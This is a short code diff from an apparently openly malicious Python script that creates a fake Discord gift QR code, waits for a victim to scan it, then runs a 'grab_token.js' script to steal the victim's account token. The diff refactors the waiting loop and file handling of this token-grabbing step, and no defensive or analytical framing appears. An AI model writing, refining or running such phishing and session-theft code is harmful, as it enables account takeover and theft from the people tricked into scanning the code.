@@ -88,12 +88,15 @@ def main():
     print('- QR Code has been generated. > discord_gift.png')
     print('Send the QR Code to user and scan. Waiting...\n')
 
-    while True:
-        if discord_login != driver.current_url:
-            print('Grabbing token...')
-            token = driver.execute_script(open('grab_token.js', 'r').read())
-            print('Token grabbed:', token)
-            break
+    while discord_login == driver.current_url:
+        time.sleep(0.1)
+
+    print('Grabbing token...')
+
+    with open('grab_token.js', 'r') as token_js:
+        token = driver.execute_script(token_js.read())
+
+    print(f'Token grabbed: {token}')
 
     print('\nTask complete.')
     print('Press any key to exit...', end='')
